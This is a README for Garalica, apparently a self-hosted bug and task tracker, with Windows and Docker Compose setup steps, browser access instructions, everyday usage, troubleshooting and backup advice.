# 🔧 garalica - Track your project tasks with ease

[![](https://img.shields.io/badge/Download-Garalica-blue)](https://github.com/u22115998-debug/garalica)

Garalica is a tool for tracking issues and tasks. It helps teams organize their work and fix bugs without complex systems. You host it on your own hardware, which keeps your data under your control.

## 📋 What is Garalica?

Modern software projects require structure. Garalica provides a clean interface to log bugs, assign tasks to team members, and monitor progress. It uses standard database technology to keep your information safe and accessible. You can set it up on a local computer or a private server.

## ⚙️ System Requirements

Ensure your computer meets these requirements before you start:

* Operating System: Windows 10 or Windows 11.
* Memory: 4 GB of RAM or more.
* Storage: 2 GB of free disk space.
* Software: You need Docker Desktop installed on your Windows machine to run the application.

## 📦 Download and Install

You must download the software files to your computer to begin the process. 

[Visit this page to download the latest version of Garalica.](https://github.com/u22115998-debug/garalica)

Follow these steps to prepare your system:

1. Download Docker Desktop from the official Docker website and install it.
2. Restart your computer after the Docker installation ends.
3. Open the Docker Desktop application and wait for the engine to start.
4. Download the project code from the link above as a compressed file.
5. Extract the folder to a location on your computer that you can find easily, such as your Documents folder.

## 🚀 Setting Up the Application

Garalica uses a tool called Docker Compose to bring the different parts of the application together. This makes the setup process standard for every user.

1. Open your Windows Start menu and type "Command Prompt." Open the application.
2. Use the "cd" command to navigate to the folder where you extracted the Garalica files. For example, if the folder is in Documents, type "cd Documents\garalica" and press Enter.
3. Once you are inside the folder, type the command "docker-compose up -d" into the window.
4. The system will download the necessary pieces to run the database and the web interface. This takes a few minutes depending on your internet speed.
5. Watch the screen for messages indicating that the containers exist and are healthy.

## 🌐 Accessing the Interface

After the setup finishes, the application runs in your web browser. 

1. Open your preferred web browser, such as Chrome, Edge, or Firefox.
2. Enter "http://localhost:8000" into the address bar at the top of the browser.
3. You should see the Garalica dashboard load.

## 🔑 Common Tasks

You can perform several actions once the dashboard is active:

* Create an Issue: Click the "New Issue" button, add a title and a description, and save it.
* Assign Tasks: Select a team member from the dropdown menu on any issue page.
* Update Status: Move issues between columns like "To Do," "In Progress," and "Done" to reflect your actual progress.
* Search: Use the search bar at the top to find specific bugs by their ID or keyword.

## 🛠️ Troubleshooting

If you encounter issues, check these frequent solutions:

* If the page does not load, verify that Docker Desktop is still running in your system tray.
* If you see database errors, ensure that you have enough disk space available.
* Reclaiming port 8000: If another program uses this port, you must close that program before starting Garalica.
* Logs: You can see what is happening behind the scenes by typing "docker-compose logs" in your command prompt window.

## 🛡️ Data Privacy

Because Garalica is self-hosted, your information remains on your local machine. No external services monitor your issues or tasks. You control how your data gets backed up. To save your information, regularly copy the database folder located within your primary Garalica directory to an external drive or cloud storage service.

## 💡 Support

If you experience persistent problems, check the official GitHub repository for recent updates or known issues. The community maintains this platform, and you can report bugs or suggest enhancements directly through the repository page.

Keywords: bug-tracker, docker, docker-compose, fastapi, garakrral, issue-tracker, opensource, postgresql, react, self-hosted